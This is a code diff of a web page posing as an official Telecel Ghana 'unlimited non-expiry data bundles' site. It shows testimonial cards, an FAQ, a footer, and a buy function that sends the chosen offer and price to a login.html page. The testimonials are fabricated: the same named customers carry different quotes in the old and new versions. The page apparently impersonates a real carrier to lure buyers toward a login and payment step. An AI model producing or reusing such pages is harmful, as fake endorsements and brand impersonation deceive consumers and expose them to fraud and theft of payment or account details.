-            <div class="testimonial-card"><strong>“Best unlimited plan I have ever used. Worth every cedi.”</strong><br><br>— Daniel Owusu, Sunyani</div>
-            <div class="testimonial-card"><strong>“Streaming all day with unlimited data. Love it!”</strong><br><br>— Akosua Mensah, Ho</div>
-            <div class="testimonial-card"><strong>“Never expires and super fast. Thank you Telecel!”</strong><br><br>— Michael Adjei, Tamale</div>
-            <div class="testimonial-card"><strong>“Unlimited data changed how I use my phone. Perfect!”</strong><br><br>— Nana Yaa, Accra</div>
-            <div class="testimonial-card"><strong>“Reliable unlimited bundles. No hidden limits.”</strong><br><br>— Samuel Ofori, Kumasi</div>
-            <div class="testimonial-card"><strong>“I can work from anywhere with this unlimited plan.”</strong><br><br>— Efua Laryea, Takoradi</div>
-            <div class="testimonial-card"><strong>“The best decision I made this year. Unlimited forever!”</strong><br><br>— Prince Boateng, Tema</div>
-            <div class="testimonial-card"><strong>“Fast, reliable and truly unlimited. 5 stars!”</strong><br><br>— Grace Asantewaa, Ho</div>
-            <div class="testimonial-card"><strong>“No expiry stress anymore. Telecel nailed it.”</strong><br><br>— Kwesi Mensah, Sunyani</div>
-            <div class="testimonial-card"><strong>“Unlimited data at affordable price. Highly satisfied!”</strong><br><br>— Patricia Osei, Accra</div>
+            <div class="testimonial-card">"Best data bundles in Ghana!" — Ama Mensah, Accra</div>
+            <div class="testimonial-card">"Truly unlimited and reliable." — Kofi Boateng, Kumasi</div>
+            <div class="testimonial-card">"Instant activation every time." — Abena Osei, Takoradi</div>
+            <div class="testimonial-card">"Great value for money." — Kwame Asante, Tema</div>
+            <div class="testimonial-card">"Never runs out. Highly recommended." — Yaa Serwaa, Cape Coast</div>
+            <div class="testimonial-card">"Best network experience." — Daniel Owusu, Sunyani</div>
+            <div class="testimonial-card">"Streaming all day with no worry." — Akosua Mensah, Ho</div>
+            <div class="testimonial-card">"Excellent service." — Michael Adjei, Tamale</div>
+            <div class="testimonial-card">"Fast and affordable." — Nana Yaa, Accra</div>
+            <div class="testimonial-card">"No more data stress." — Samuel Ofori, Kumasi</div>
+            <div class="testimonial-card">"Perfect for students." — Efua Laryea, Takoradi</div>
+            <div class="testimonial-card">"Family plan is perfect." — Prince Boateng, Tema</div>
+            <div class="testimonial-card">"5 stars all the way!" — Grace Asantewaa, Ho</div>
+            <div class="testimonial-card">"Cheapest unlimited bundles." — Kwesi Mensah, Sunyani</div>
+            <div class="testimonial-card">"Telecel is now my number one." — Patricia Osei, Accra</div>
         </div>
     </section>
 
-    <!-- FAQ (10) -->
-    <section class="faq">
+    <!-- FAQ -->
+    <section class="faq-section">
         <h2 class="section-title">Frequently Asked Questions</h2>
-        <div style="max-width:1000px; margin:0 auto;">
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Does the data really never expire? <span>▼</span></div><div class="faq-answer">Yes! All bundles have no expiry date. Use at your own pace.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Is it truly unlimited data? <span>▼</span></div><div class="faq-answer">Yes, especially on Platinum and Diamond plans.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">How fast is activation? <span>▼</span></div><div class="faq-answer">Instant activation after successful payment.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Can I use unlimited data for hotspot? <span>▼</span></div><div class="faq-answer">Yes, tethering is fully supported.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">What happens when I finish the main bundle? <span>▼</span></div><div class="faq-answer">You can buy another bundle immediately.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Are these plans available to all Telecel users? <span>▼</span></div><div class="faq-answer">Yes, available only for active Telecel Regular users.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Can I stack multiple unlimited bundles? <span>▼</span></div><div class="faq-answer">Yes, you can buy as many as you want.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">How do I check my remaining data? <span>▼</span></div><div class="faq-answer">Dial *124# or use the Telecel App.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Is there fair usage policy on unlimited plans? <span>▼</span></div><div class="faq-answer">Yes, standard fair usage applies for network management.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">How do I pay for these bundles? <span>▼</span></div><div class="faq-answer">Via Mobile Money, Bank Transfer or Telecel App.</div></div>
+        <div style="max-width:850px; margin:0 auto;">
+            <div class="faq-item"><button class="faq-question" onclick="toggleFAQ(this)">How fast is activation? <span>▼</span></button><div class="faq-answer" style="padding:15px 20px; display:none;">Instant after successful payment.</div></div>
+            <div class="faq-item"><button class="faq-question" onclick="toggleFAQ(this)">Do the bundles expire? <span>▼</span></button><div class="faq-answer" style="padding:15px 20px; display:none;">Most monthly bundles last 30 days.</div></div>
+            <div class="faq-item"><button class="faq-question" onclick="toggleFAQ(this)">Can I use for hotspot? <span>▼</span></button><div class="faq-answer" style="padding:15px 20px; display:none;">Yes, tethering is supported.</div></div>
+            <div class="faq-item"><button class="faq-question" onclick="toggleFAQ(this)">How do I check my balance? <span>▼</span></button><div class="faq-answer" style="padding:15px 20px; display:none;">Dial *124# or use the Telecel App.</div></div>
+            <div class="faq-item"><button class="faq-question" onclick="toggleFAQ(this)">Can I buy multiple bundles? <span>▼</span></button><div class="faq-answer" style="padding:15px 20px; display:none;">Yes, you can stack bundles.</div></div>
+            <div class="faq-item"><button class="faq-question" onclick="toggleFAQ(this)">Is there fair usage on unlimited? <span>▼</span></button><div class="faq-answer" style="padding:15px 20px; display:none;">Yes, standard fair usage applies.</div></div>
+            <div class="faq-item"><button class="faq-question" onclick="toggleFAQ(this)">Do you support Mobile Money? <span>▼</span></button><div class="faq-answer" style="padding:15px 20px; display:none;">Yes, all major networks supported.</div></div>
+            <div class="faq-item"><button class="faq-question" onclick="toggleFAQ(this)">Is the network nationwide? <span>▼</span></button><div class="faq-answer" style="padding:15px 20px; display:none;">Yes, available across Ghana.</div></div>
+            <div class="faq-item"><button class="faq-question" onclick="toggleFAQ(this)">Can I get a refund? <span>▼</span></button><div class="faq-answer" style="padding:15px 20px; display:none;">Yes, within 24 hours if not activated.</div></div>
+            <div class="faq-item"><button class="faq-question" onclick="toggleFAQ(this)">How do I contact support? <span>▼</span></button><div class="faq-answer" style="padding:15px 20px; display:none;">Call 100 or use live chat.</div></div>
         </div>
     </section>
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/694a65c91f0ade19740a3331/1jd59r7eu';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<!--End of Tawk.to Script-->
-    <!-- FOOTER -->
+
+    <!-- Footer -->
     <footer>
-        <div class="footer-grid">
-            <div>
-                <div style="justify-content:center;display:flex;margin-bottom:15px;">
-                    <svg width="70" height="70" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <circle cx="48" cy="48" r="46" fill="white"/>
-                        <text x="48" y="53" font-family="Arial Black" font-size="54" font-weight="900" fill="#E30613" text-anchor="middle" dominant-baseline="middle">T</text>
-                    </svg>
-                </div>
-                <h4 style="color:white;">Telecel Ghana</h4>
-                <p>Connecting Ghana Better with Unlimited Non-Expiry Data</p>
-            </div>
-            <div>
-                <h4 style="color:white;">Our Services</h4>
-                <p>Non-Expiry Data Bundles</p>
-                <p>Voice & SMS Packages</p>
-                <p>Unlimited Internet</p>
-            </div>
-            <div>
-                <h4 style="color:white;">Support</h4>
-                <p>Call: 100</p>
-                <p>support@telecel.com.gh</p>
-                <p>24/7 Customer Care</p>
-            </div>
-            <div>
-                <h4 style="color:white;">Company</h4>
-                <p>About Telecel</p>
-                <p>Coverage Map</p>
-                <p>Terms & Privacy</p>
-            </div>
+        <div class="footer-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 40px; max-width: 1200px; margin: 0 auto 50px;">
+            <div><h4>Telecel Ghana</h4><p>Connecting Ghana Better</p></div>
+            <div><h4>Quick Links</h4><p>Data Bundles</p><p>Benefits</p><p>Support</p></div>
+            <div><h4>Contact</h4><p>Call: 100</p><p>support@telecel.com.gh</p></div>
+            <div><h4>Company</h4><p>About Telecel</p><p>Terms & Privacy</p></div>
         </div>
-        <p style="text-align:center;margin-top:70px;opacity:0.7;font-size:0.95rem;">© 2026 Telecel Ghana. All Rights Reserved. | Official Non-Expiry Data Bundles Platform</p>
+        <p>© 2026 Telecel Ghana. All Rights Reserved. | Official Data Bundles Platform</p>
     </footer>
 
     <script>
-        function buyOffer(tier, data, price) {
-            const params = new URLSearchParams({ tier: tier, data: data, price: price });
-            window.location.href = `login.html?${params.toString()}`;
+        function buyOffer(offerName, amount) {
+            window.location.href = `login.html?offer=${encodeURIComponent(offerName)}&amount=${amount}`;
         }
+
         function toggleFAQ(el) {
             const answer = el.nextElementSibling;
-            answer.style.display = answer.style.display === 'block' ? 'none' : 'block';
+            answer.style.display = (answer.style.display === 'block') ? 'none' : 'block';
         }
     </script>
 </body>
